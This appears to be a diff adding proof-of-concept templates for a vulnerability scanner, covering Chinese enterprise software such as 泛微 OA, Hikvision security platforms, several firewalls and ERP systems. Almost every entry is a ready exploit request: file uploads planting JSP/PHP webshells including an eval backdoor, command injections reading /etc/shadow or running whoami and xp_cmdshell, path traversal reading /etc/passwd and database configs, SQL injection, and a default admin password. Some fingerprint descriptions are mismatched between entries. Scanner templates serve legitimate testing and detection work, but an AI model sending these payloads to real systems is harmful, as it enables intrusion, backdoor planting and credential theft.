+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"Microsoft SQL Server\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "泛微任意文件上传漏洞"
+    info:
+      name: "泛微任意文件上传漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/page/exportImport/uploadOperation.jsp"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=---------------------------WebKitFormBoundary6XgyjB6SeCArD3Hc"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
+                Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\n\
+                User-Agent: Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/92.0.4515.159 Safari/537.36\r\n\
+                Accept-Encoding: gzip, deflate\r\n\
+                X-Forwarded-For: 127.0.0.1\r\n
+                Connection: close\r\n
+                Upgrade-Insecure-Requests: 1\r\n
+                Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\n
+                \r\n\          
+                ------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test456.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n202cb962ac59075b964b07152d234b70\r\n------WebKitFormBoundary6XgyjB6SeCArD3Hc--\r\n
+                "
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: "/page/exportImport/fileTransfer/test456.jsp"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"202cb962ac59075b964b07152d234b70\") && equalsFunc(r\\.StatusCode, 200)"
+
+  - id: "泛微OA系统BshServlet命令执行漏洞"
+    info:
+      name: "泛微OA系统BshServlet命令执行漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/weaver/bsh.servlet.BshServlet"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "bsh.script=import+org.apache.commons.codec.digest.DigestUtils%3Bprint%28DigestUtils.md5Hex%28%22123%22%29%29%0D%0A"
+        matchers: "containsFunc(r\\.Text, \"202cb962ac59075b964b07152d234b70\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "泛微云桥 e-Bridge 任意文件读取"
+    info:
+      name: "泛微云桥 e-Bridge 任意文件读取"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"id\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "帆软 V9 任意文件覆盖文件上传"
+    info:
+      name: "帆软 V9 任意文件覆盖文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "{\"__CONTENT__\":\"<%out.println(\"202cb962ac59075b964b07152d234b70\");%>\", \"__CHARSET__\":\"UTF-8\"}"
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: "/WebReport/a.svg.jsp"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"202cb962ac59075b964b07152d234b70\") && equalsFunc(r\\.StatusCode, 200)"
+  
+  - id: "HiKVISION 综合安防管理平台 report 任意文件上传漏洞"
+    info:
+      name: "HiKVISION 综合安防管理平台 report 任意文件上传漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"HiKVISION\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/svm/api/external/report"
+          allow_redirects: false
+          headers:
+            content-type: "multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+                ------WebKitFormBoundary9PggsiM755PLa54a\r\n
+                Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\"\r\n
+                Content-Type: application/zip\r\n
+                \r\n
+                qaxnb
+                \r\n
+                ------WebKitFormBoundary9PggsiM755PLa54a--\r\n
+                "
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: "/portal/ui/login/..;/..;/new.jsp"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"qaxnb\") && equalsFunc(r\\.StatusCode, 200)"
+  
+  - id: "HiKVISION 综合安防管理平台 files 任意文件上传漏洞"
+    info:
+      name: "HiKVISION 综合安防管理平台 files 任意文件上传漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"HiKVISION\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/center/api/files;.html"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=----------------------------180188939909122941133151"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+                ----------------------------180188939909122941133151\r\n
+                Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/hello.jsp\"\r\n
+                Content-Type: application/octet-stream\r\n
+                \r\n
+                hello
+                \r\n
+                ----------------------------180188939909122941133151--\r\n
+                "
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: "/clusterMgr/hello.jsp;.js"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"hello\") && equalsFunc(r\\.StatusCode, 200)"
+  
+  - id: "Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞"
+    info:
+      name: "Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "title=\"index\" && header=\"lighttpd/1.4.30\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137921"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"PING 1.1.1.1\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "网神SecGate 3600 obj_app_upfile"
+    info:
+      name: "网神SecGate 3600 obj_app_upfile"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "fid=\"1Lh1LHi6yfkhiO83I59AYg==\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/?g=obj_app_upfile;"
+          allow_redirects: true
+          headers:
+            content-type: "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
+              Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\
+              \r\n\
+              10000000\r\n\
+              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
+              Content-Disposition: form-data; name=\"upfile\"; filename=\"qaxnb.php\"\r\n\
+              Content-Type: text/plain\r\n\
+              \r\n\
+              <?php system(\"id\")?>\r\n\
+              \r\n\
+              \r\n\
+              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
+              Content-Disposition: form-data; name=\"submit_post\"\r\n\
+              \r\n\
+              obj_app_upfile\r\n\
+              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
+              Content-Disposition: form-data; name=\"__hash__\"\r\n\
+              \r\n\
+              0b9d6b1ab7479ab69d9f71b05e0e9445\r\n\
+              ------WebKitFormBoundaryJpMyThWnAxbcBBQc--\r\n\
+              "
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: "/attachements/qaxnb.php"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"uid\") && equalsFunc(r\\.StatusCode, 200)"
+  
+  - id: "亿赛通电子文档安全管理系统远程命令执行漏洞"
+    info:
+      name: "亿赛通电子文档安全管理系统远程命令执行漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"亿赛通-电子文档安全管理系统\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              <?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n\
+                  <RDF>\r\n\
+                  <item/>\r\n\
+                  </RDF>\r\n\
+              "
+        matchers: "containsFunc(r\\.Text, \"nt authority\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "深信服应用交付 AD 远程命令执行漏洞"
+    info:
+      name: "深信服应用交付 AD 远程命令执行漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "fid=\"iaytNA57019/kADk8Nev7g==\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/rep/login"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
+        matchers: "containsFunc(r\\.Text, \"uid\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "安恒明御安全网关rce"
+    info:
+      name: "安恒明御安全网关rce"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "body=\"/webui/images/basic/login/\" && title==\"明御安全网关\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          # path: "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+\"<%3fphpteval(\\$_POST[\"a\"]) ;?>\"+>+.qaxnb.php"
+          path: "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(\"id+>/usr/local/webui/test.txt\")}}"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"success\") && containsFunc(r\\.Text, \"local_logo\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: "GET"
+          path: "/test.txt"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "网康科技-下一代防火墙"
+    info:
+      name: "网康科技-下一代防火墙rce"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"网康科技-下一代防火墙\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/directdata/direct/router"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              {\r\n
+                  \"action\": \"SSLVPN_Resource\",\r\n
+                  \"method\": \"deleteImage\",\r\n
+                  \"data\":[{\r\n
+                          \"data\":[\"/var/www/html/b.txt;echo '<?php @eval($_POST[a]);?>'>/var/www/html/test.php\"]\r\n
+                          }],\r\n
+                  \"type\": \"rpc\",\r\n
+                  \"tid\": 17\r\n
+              }\r\n
+              "
+        matchers: "containsFunc(r\\.Text, \"rpc\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: "GET"
+          path: "/test.php"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "PigCMS_action_flashUpload_upload"
+    info:
+      name: "PigCMS_action_flashUpload_upload"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"网康科技-下一代防火墙\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload"
+          allow_redirects: false
+          headers:
+            content-type: "multipart/form-data; boundary=----aaa"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              ------aaa\r\n\
+              Content-Disposition: form-data; name=\"filePath\"; filename=\"test.php\"\r\n\
+              Content-Type: video/x-flv\r\n\
+              \r\n\
+              <?php phpinfo();?>\r\n\
+              ------aaa\r\n\
+              "
+        matchers: "containsFunc(r\\.Text, \".php\") && containsFunc(r\\.Text, \"upload/images\")"
+      rule1:
+        requests:
+          method: "GET"
+          path: "/test.php"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "Milesight VPN server.js 任意文件读取漏洞"
+    info:
+      name: "Milesight VPN server.js 任意文件读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "MilesightVPN"
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/%2e%2e/etc/passwd"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"/bin/bash\") && containsFunc(r\\.Text, \"root\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "飞企互联FE业务协作平台ShowImageServlet任意文件读取"
+    info:
+      name: "飞企互联FE业务协作平台ShowImageServlet任意文件读取"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "flyrise.stopBackspace.js"
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"mssql\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "金蝶云星空CommonFileserver任意文件读取漏洞"
+    info:
+      name: "金蝶云星空CommonFileserver任意文件读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "flyrise.stopBackspace.js"
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/CommonFileServer/c:/windows/win.ini"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"files\") && containsFunc(r\\.Text, \"fonts\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "企望制造_ERP_comboxstore远程命令执行"
+    info:
+      name: "企望制造_ERP_comboxstore远程命令执行"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "title=\"企望制造ERP系统\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/mainFunctions/comboxstore.action"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "comboxsql=exec%20xp_cmdshell%20'type%20C:\\Windows\\Win.ini'"
+        matchers: "containsFunc(r\\.Text, \"files\") && containsFunc(r\\.Text, \"fonts\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "启明星辰4A统一安全管控平台getMaster信息泄漏"
+    info:
+      name: "启明星辰4A统一安全管控平台getMaster信息泄漏"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "body=\"cas/css/ace-part2.min.css\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/accountApi/getMaster.do"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"true\") && containsFunc(r\\.Text, \"password\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+  
+  - id: "Panabit iXCache网关弱口令和RCE漏洞"
+    info:
+      name: "Panabit iXCache网关弱口令和RCE漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "body=\"cas/css/ace-part2.min.css\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/login/userverify.cgi"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "username=admin&password=ixcache"
+        matchers: "Set-Cookie"
+      rule1:
+        requests:
+          method: "POST"
+          path: "/cgi-bin/Maintain/date_config"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "ntpserver=0.0.0.0%3Bwhoami&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1"
+        matchers: "containsFunc(r\\.Text, \"root\")"
+  
+  - id: "用友OA U8 test.jsp sql注入漏洞"
+    info:
+      name: "用友OA U8 test.jsp sql注入漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "用友OA U8"
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "username=admin&password=ixcache"
+        matchers: "containsFunc(r\\.Text, \"c4ca4238a0b923820dcc509a6f75849b\") &&  equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
